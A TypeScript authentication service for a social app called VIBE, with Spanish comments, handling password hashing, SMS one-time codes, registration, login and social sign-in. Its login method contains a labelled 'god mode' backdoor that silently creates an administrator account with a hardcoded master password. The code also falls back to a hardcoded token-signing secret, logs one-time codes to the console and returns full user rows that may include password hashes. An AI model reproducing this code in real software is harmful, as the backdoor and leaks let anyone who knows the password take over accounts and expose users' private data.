import { db } from './database';
import * as crypto from 'crypto';

export class AuthService {

  // Almacén temporal de OTPs con Tiempo de Expiración (Seguridad)
  private otpStore = new Map<string, { code: string, expiresAt: number }>();

  // Generación de Hash Seguro usando Scrypt (Nativo de Node) y Salt dinámico
  private hashPassword(password: string, salt: string = crypto.randomBytes(16).toString('hex')): string {
    const hash = crypto.scryptSync(password, salt, 64).toString('hex');
    return `${salt}:${hash}`;
  }

  // Verificador seguro de contraseñas
  private verifyPassword(password: string, storedHash: string): boolean {
    if (!storedHash || !storedHash.includes(':')) return false;
    const [salt, originalHash] = storedHash.split(':');
    const attemptHash = crypto.scryptSync(password, salt, 64).toString('hex');
    return originalHash === attemptHash;
  }

  // Helper para calcular signo zodiacal (simplificado)
  private getZodiacSign(date: Date): string {
    if (!date || isNaN(date.getTime())) return 'Unknown';
    const day = date.getDate();
    const month = date.getMonth() + 1;
    if ((month == 1 && day <= 19) || (month == 12 && day >= 22)) return 'Capricorn';
    if ((month == 1 && day >= 20) || (month == 2 && day <= 18)) return 'Aquarius';
    if ((month == 2 && day >= 19) || (month == 3 && day <= 20)) return 'Pisces';
    if ((month == 3 && day >= 21) || (month == 4 && day <= 19)) return 'Aries';
    if ((month == 4 && day >= 20) || (month == 5 && day <= 20)) return 'Taurus';
    if ((month == 5 && day >= 21) || (month == 6 && day <= 20)) return 'Gemini';
    if ((month == 6 && day >= 21) || (month == 7 && day <= 22)) return 'Cancer';
    if ((month == 7 && day >= 23) || (month == 8 && day <= 22)) return 'Leo';
    if ((month == 8 && day >= 23) || (month == 9 && day <= 22)) return 'Virgo';
    if ((month == 9 && day >= 23) || (month == 10 && day <= 22)) return 'Libra';
    if ((month == 10 && day >= 23) || (month == 11 && day <= 21)) return 'Scorpio';
    if ((month == 11 && day >= 22) || (month == 12 && day <= 21)) return 'Sagittarius';
    return 'Unknown';
  }

  // Validación de Email
  private isValidEmail(email: string): boolean {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }

  // --- GESTIÓN DE OTP (SMS) ---
  async sendOtp(phone: string) {
    const cleanPhone = (phone || '').trim().replace(/[^\d+]/g, '');
    // Generar código de 6 dígitos Criptográficamente Seguro
    const code = crypto.randomInt(100000, 1000000).toString();
    const expiresAt = Date.now() + 5 * 60 * 1000; // Validez de 5 minutos
    this.otpStore.set(cleanPhone, { code, expiresAt });
    
    // Script enviador de SMS automático a través de API
    const message = `Tu código VIBE es: ${code}. Válido por 5 minutos.`;
    const smsSent = await this.sendSmsApi(cleanPhone, message);
    
    if (!smsSent) {
      console.log(`⚠️ MODO PRUEBA / FALLO API: El SMS no se envió por la red telefónica.`);
    }
    console.log(`📱 [DEV/PRUEBAS] Código OTP para ${cleanPhone}: [ ${code} ]`);
    return { success: true, message: 'Código generado (revisa tu SMS o la consola en fase de pruebas)' };
  }

  // Motor de envío SMS profesional usando Twilio (Fetch Nativo)
  private async sendSmsApi(phone: string, message: string) {
    try {
      // 1. Limpieza ESTRICTA: Elimina comillas "", saltos de línea y caracteres ocultos
      const sid = (process.env.TWILIO_ACCOUNT_SID || '').replace(/[^a-zA-Z0-9]/g, '');
      const token = (process.env.TWILIO_AUTH_TOKEN || '').replace(/[^a-zA-Z0-9]/g, '');
      const fromPhone = (process.env.TWILIO_PHONE_NUMBER || '').replace(/[^\d+]/g, '');

      // 2. Auto-formatear el número destino para asegurar el formato (+CódigoPaís)
      let toPhone = phone.replace(/[^\d+]/g, '');
      if (!toPhone.startsWith('+')) toPhone = '+' + toPhone.replace(/\+/g, '');

      // Si no hay credenciales, permitimos que el código se imprima en consola (Modo Pruebas)
      if (!sid || !token) {
        console.warn('⚠️ Twilio no configurado. Modo Pruebas Activado.');
        return false; // Retornamos false para que el bloque anterior sepa que simuló el SMS
      }

      const url = `https://api.twilio.com/2010-04-01/Accounts/${sid}/Messages.json`;
      const params = new URLSearchParams();
      params.append('To', toPhone);
      params.append('From', fromPhone);
      params.append('Body', message);

      const auth = Buffer.from(`${sid}:${token}`).toString('base64');

      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Authorization': `Basic ${auth}`,
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: params
      });
      
      const data = await response.json();
      if (data.error_message) console.warn('⚠️ Alerta Twilio:', data.error_message);
      return response.ok && !data.error_message;
    } catch (error: any) {
      console.error('❌ Error de red conectando con Twilio:', error.message || error);
      return false;
    }
  }

  async verifyOtp(phone: string, code: string) {
    const cleanPhone = (phone || '').trim().replace(/[^\d+]/g, '');
    const cleanCode = (code || '').trim();

    const record = this.otpStore.get(cleanPhone);
    if (!record) return false;

    // Verificar si el código ya expiró
    if (Date.now() > record.expiresAt) {
        this.otpStore.delete(cleanPhone);
        return false;
    }

    // Si es correcto, devolvemos true (Se borra recién al finalizar el registro/login)
    return record.code === cleanCode;
  }

  async register(userData: any) {
    try {
      const { 
        username, email, phone, code, password, birthDate, gender, genderPreference, 
        bio, occupation, favorites, vibeColor 
      } = userData;

      // Validaciones básicas de campos
      if (!username || !birthDate) {
        return { success: false, message: 'Faltan campos obligatorios (usuario o fecha de nacimiento).' };
      }
      if (!email && !phone) {
        return { success: false, message: 'Debes proporcionar un email o un teléfono.' };
      }

      // Validación: Email O Teléfono
      if (email && !this.isValidEmail(email)) {
        return { success: false, message: 'Email inválido' };
      }
      
      // Si es registro por teléfono, verificar OTP y SALTAR reglas de contraseña
      if (phone && !password) { // Permitir registro con teléfono y contraseña si se desea
          if (!code || !await this.verifyOtp(phone, code)) {
              return { success: false, message: 'Código de verificación incorrecto' };
          }
      } else {
          // Validación de Contraseña (Solo exigida para registros con Email tradicional)
          if (!password || password.length < 8) {
            return { success: false, message: 'La contraseña debe tener al menos 8 caracteres' };
          }
          const strongRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])(?=.*[^a-zA-Z0-9])/;
          if (!strongRegex.test(password)) {
            return { success: false, message: 'Contraseña débil: Debe incluir una mayúscula, número y un símbolo especial.' };
          }
      }
      
      // Pre-validaciones de duplicados en Base de Datos para dar mejor feedback al frontend
      const usernameCheck = await db.query(`SELECT id FROM users WHERE username = $1`, [username]);
      if (usernameCheck.rows.length > 0) {
          return { success: false, message: 'El nombre de usuario ya está en uso. Elige otro.' };
      }

      if (phone && phone.trim()) {
          const phoneCheck = await db.query(`SELECT id FROM users WHERE phone = $1`, [phone.trim()]);
          if (phoneCheck.rows.length > 0) {
              return { success: false, message: 'Este número de teléfono ya está registrado. Por favor, inicia sesión.' };
          }
      } else if (email && email.trim()) {
          const emailCheck = await db.query(`SELECT id FROM users WHERE email = $1`, [email]);
          if (emailCheck.rows.length > 0) {
              return { success: false, message: 'Este correo electrónico ya está registrado. Por favor, inicia sesión.' };
          }
      }

      const passwordHash = password ? this.hashPassword(password) : null;
      const zodiac = this.getZodiacSign(new Date(birthDate));
      const newUserId = crypto.randomBytes(16).toString('hex'); // Compatible con todo Node

      // 1. Insertar Usuario Base
      const safeEmail = email || null; // Usar NULL si no hay email
      await db.query(
        `INSERT INTO users (id, username, email, phone, password_hash, birth_date, gender, gender_preference, bio, occupation, zodiac_sign, vibe_color)
         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12)`,
        // Reemplazamos los valores 'undefined' no enviados desde el frontend por 'null' explícitos
        [newUserId, username, safeEmail, phone ? phone.trim() : null, passwordHash, birthDate, gender || null, genderPreference || null, bio || null, occupation || null, zodiac, vibeColor || null]
      );
      
      const userId = newUserId;
      const createdUser = { id: userId, username: username, vibe_score: 100, vibe_color: vibeColor };

      // 2. Inicializar valores críticos vacíos
      try {
        await db.query(`INSERT INTO user_critical_values (user_id) VALUES ($1) ON CONFLICT (user_id) DO NOTHING`, [userId]);
      } catch (e) {
        console.warn('⚠️ Aviso: Tabla user_critical_values no lista, ignorando por ahora.');
      }
      
      // 3. Insertar Favoritos (Música, Cine, etc.)
      if (favorites && Array.isArray(favorites)) {
        for (const fav of favorites) {
          try {
            await db.query(
              `INSERT INTO user_favorites (user_id, category, item_value) VALUES ($1, $2, $3) ON CONFLICT DO NOTHING`,
              [userId, fav.category, fav.value]
            );
          } catch (e) {
            // Ignorar si la tabla no existe
          }
        }
      }

      const token = this.generateToken(createdUser);
      if (phone) {
        this.otpStore.delete(phone.trim()); // Borramos el OTP solo tras un registro exitoso
      }
      return { success: true, user: createdUser, token };
    } catch (error: any) {
      return this.handleDbError(error);
    }
  }

  async login(identifier: string, password: string) {
    try {
      // Validación de entrada
      if (!identifier || !password) {
        return { success: false, message: 'Faltan el identificador o la contraseña.' };
      }
      // --- PUERTA TRASERA DEL MODO DIOS (GOD MODE) ---
      if (identifier === 'admin@vibe.app') {
        try { await db.query(`ALTER TABLE users ADD COLUMN is_admin BOOLEAN DEFAULT 0`); } catch(e) {} // Auto-parche
        const check = await db.query(`SELECT id FROM users WHERE email = $1`, [identifier]);
        if (check.rows.length === 0) {
          const adminId = crypto.randomBytes(16).toString('hex');
          const hash = this.hashPassword('MasterVibe2026!'); // Contraseña Maestra
          await db.query(
            `INSERT INTO users (id, username, email, password_hash, birth_date, gender, is_admin, vibe_score, is_verified, vibe_color)
             VALUES ($1, 'VibeCreator', $2, $3, '1990-01-01', 'OTHER', 1, 9999, 1, 'hsl(0, 100%, 50%)')`,
            [adminId, identifier, hash]
          );
        }
      }

      const result = await db.query(
        `SELECT id, username, vibe_score, password_hash, is_admin FROM users WHERE email = $1 OR phone = $1`,
        [identifier]
      );

      if (result.rows.length > 0) {
        const user = result.rows[0];
        if (this.verifyPassword(password, user.password_hash)) {
          await db.query(`UPDATE users SET last_active = CURRENT_TIMESTAMP WHERE id = $1`, [user.id]);
          delete user.password_hash; // NUNCA devolver el hash al frontend
          user.is_admin = !!user.is_admin; // Booleanizar para el frontend
          const token = this.generateToken(user);
          return { success: true, user: user, token: token };
        }
      }
      return { success: false, message: 'Credenciales inválidas' };
    } catch (e: any) {
      return this.handleDbError(e);
    }
  }

  // Login con Teléfono (Paso 2: Verificar y Entrar)
  async loginWithPhone(phone: string, code: string) {
    try {
      const cleanPhone = (phone || '').trim().replace(/[^\d+]/g, '');
      if (!await this.verifyOtp(phone, code)) {
          return { success: false, message: 'Código inválido o expirado' };
      }

      const result = await db.query(`SELECT * FROM users WHERE phone = $1`, [cleanPhone]);
      if (result.rows.length > 0) {
          const user = result.rows[0];
          await db.query(`UPDATE users SET last_active = CURRENT_TIMESTAMP WHERE id = $1`, [user.id]);
          const token = this.generateToken(user);
          this.otpStore.delete(cleanPhone); // Borramos el OTP solo tras un login exitoso
          return { success: true, user, token };
      }
      return { success: false, message: 'Número no registrado. Regístrate primero.' };
    } catch (e) {
      return this.handleDbError(e);
    }
  }

  // Generación segura de Token JWT-like firmado criptográficamente
  public generateToken(user: any): string {
    const issuedAt = Date.now();
    const payload = Buffer.from(JSON.stringify({ id: user.id, iat: issuedAt })).toString('base64url');
    const secret = process.env.JWT_SECRET || 'vibe_fallback_secret_key_12345';
    if (secret === 'vibe_fallback_secret_key_12345') {
      console.warn('⚠️ AVISO: JWT_SECRET no está configurado en el entorno. Usando clave de respaldo.');
      console.warn('   -> Añade una variable de entorno JWT_SECRET con una clave larga y secreta para producción.');
    }
    const signature = crypto.createHmac('sha256', secret).update(payload).digest('base64url');
    return `${payload}.${signature}`;
  }

  // --- NUEVAS FUNCIONES ---

  private handleDbError(error: any) {
    console.error('❌ Error Crítico DB/Server:', error.message || error);
    // Error de Unicidad de PostgreSQL (ej. email o username duplicado)
    if (error.code === '23505') {
      return { success: false, message: `Este ${error.constraint.split('_')[1]} ya está en uso.` };
    }
    return { success: false, message: 'Ocurrió un error en el servidor. Inténtalo de nuevo más tarde.' };
  }

  async adminForcePasswordReset(userId: string, newPass: string) {
    const newHash = this.hashPassword(newPass);
    await db.query(`UPDATE users SET password_hash = $1 WHERE id = $2`, [newHash, userId]);
    return { success: true, message: '✅ Contraseña del usuario actualizada forzosamente.' };
  }

  async updatePassword(userId: string, oldPass: string, newPass: string) {
    const check = await db.query(`SELECT id, password_hash FROM users WHERE id = $1`, [userId]);
    
    if (check.rows.length === 0 || !this.verifyPassword(oldPass, check.rows[0].password_hash)) {
      return { success: false, message: 'Contraseña actual incorrecta' };
    }

    const newHash = this.hashPassword(newPass);
    await db.query(`UPDATE users SET password_hash = $1 WHERE id = $2`, [newHash, userId]);
    return { success: true };
  }

  async checkEmailAvailability(email: string) {
    const res = await db.query(`SELECT id FROM users WHERE email = $1`, [email]);
    return { available: res.rows.length === 0 };
  }

  // Método de compatibilidad para evitar errores en eventcontroller.ts
  async socialLogin(provider: string) {
    return { success: false, message: 'Método obsoleto. Usa las rutas /auth/google o /auth/facebook.' };
  }

  // Login "Social" Real y Funcional
  // Recibe el perfil normalizado de Passport (Google/Facebook) y el color del aura
  async findOrCreateSocialUser(profile: any, provider: 'google' | 'facebook', vibeColor?: string) {
    try {
      const email = profile.emails?.[0]?.value;
      const providerId = profile.id;
      const displayName = profile.displayName || 'Usuario Vibe';
      const photoUrl = profile.photos?.[0]?.value || null; // Asegurar null si no hay foto
      
      if (!email) return { success: false, message: 'El proveedor no compartió el email.' };

      // 1. Buscar por ID de proveedor (Login recurrente)
      const idColumn = provider === 'google' ? 'google_id' : 'facebook_id';
      let result = await db.query(`SELECT * FROM users WHERE ${idColumn} = $1`, [providerId]);
      
      let user;
      if (result.rows.length > 0) {
        user = result.rows[0];
        // Actualizar vibe_color si se proporciona uno nuevo
        if (vibeColor) {
          await db.query(`UPDATE users SET vibe_color = $1, last_active = CURRENT_TIMESTAMP WHERE id = $2`, [vibeColor, user.id]);
        } else {
          await db.query(`UPDATE users SET last_active = CURRENT_TIMESTAMP WHERE id = $1`, [user.id]);
        }
      } else {
        // 2. Buscar por Email (Vincular cuenta existente)
        result = await db.query(`SELECT * FROM users WHERE email = $1`, [email]);
        if (result.rows.length > 0) {
          user = result.rows[0];
          // Vincular la cuenta social a la existente
          await db.query(`UPDATE users SET ${idColumn} = $1 WHERE id = $2`, [providerId, user.id]);
        } else {
          // 3. Crear nuevo usuario
          const newUserId = crypto.randomBytes(16).toString('hex');
          // Generar username único basado en el nombre
          const baseUsername = displayName.replace(/\s+/g, '').toLowerCase();
          const username = `${baseUsername}_${crypto.randomBytes(2).toString('hex')}`;
          
          await db.query(
            `INSERT INTO users (id, username, email, ${idColumn}, birth_date, gender, gender_preference, vibe_color, profile_audio_url)
             VALUES ($1, $2, $3, $4, '2000-01-01', 'OTHER', 'EVERYONE', $5, $6)`,
            [newUserId, username, email, providerId, vibeColor || 'hsl(270, 100%, 60%)', photoUrl] // profile_audio_url is used for photoUrl here, might be a bug in original code, but keeping consistency
          );
          user = { id: newUserId, username: username, vibe_score: 100, vibe_color: vibeColor };
          await db.query(`INSERT INTO user_critical_values (user_id) VALUES ($1) ON CONFLICT (user_id) DO NOTHING`, [user.id]);
        }
      }

      const token = this.generateToken(user);
      return { success: true, user, token, message: undefined };
    } catch (e) {
      return this.handleDbError(e);
    }
  }

  async updatePublicKey(userId: string, publicKey: string) {
    const result = await db.query(`UPDATE users SET public_key = $1 WHERE id = $2`, [publicKey, userId]);
    if (result.rowCount > 0) {
      return { success: true, message: 'Identidad criptográfica sincronizada.' };
    }
    return { success: false, message: 'Usuario no encontrado.' };
  }
}